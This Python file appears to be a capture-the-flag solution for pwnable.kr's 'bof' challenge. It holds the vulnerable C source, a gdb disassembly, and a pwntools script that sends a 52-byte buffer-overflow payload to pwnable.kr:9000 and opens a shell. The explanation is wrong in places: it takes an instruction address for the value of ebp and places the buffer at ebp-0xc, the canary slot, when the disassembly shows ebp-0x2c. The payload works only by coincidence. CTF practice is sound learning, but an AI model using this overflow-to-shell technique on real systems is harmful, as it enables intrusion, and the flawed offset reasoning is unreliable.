'''
bof challenge from pwnable.kr
Classic bufferoverflow, source code given.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

Okay so we need to overflow "overflowme", overwrite key with 0xcafebabe to pop a shell from the server.

Examine func in gdb

    0x5655562c <+0>:     push   ebp
    0x5655562d <+1>:     mov    ebp,esp
    0x5655562f <+3>:     sub    esp,0x48
=>  0x56555632 <+6>:     mov    eax,gs:0x14
 *  0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
    0x5655563b <+15>:    xor    eax,eax
    0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
    0x56555644 <+24>:    call   0xf7e3d550 <puts>
    0x56555649 <+29>:    lea    eax,[ebp-0x2c]
    0x5655564c <+32>:    mov    DWORD PTR [esp],eax
    0x5655564f <+35>:    call   0xf7e3cb00 <gets>
 *  0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe

At *: overflowme variable was created, at ebp-0xc (local variable)
At next *: cmp with 0xcafebabe, located at ebp+0x8 (function argument)
We know at ebp is 0x5655562c:
    => overflowme me is at: 0x5655562c - 0xc 
       0xcafebabe is at: 0x5655562c + 0x8
Distance between 2 is 20 bytes
Size of overflowme is 32, so our payload will have 52 bytes,
Craft the exploit:

After execuation, we should have a shell on the server, we can cat flag:
"daddy, I just pwned a buFFer :)"
'''

from pwn import *

def pwn():
    connect = remote("pwnable.kr", 9000) # connect to pwnable server

    fillBuf = "A"*32                # fill up overflowme
    dist = "\x90"*20                # NOPs, fill up the distance between the two
    overwrite = "\xbe\xba\xfe\xca"  # 0xcafebabe in little endian
    
    payload = fillBuf + dist + overwrite
    connect.sendline(payload)
    connect.interactive()

if __name__ == "__main__":
    pwn()
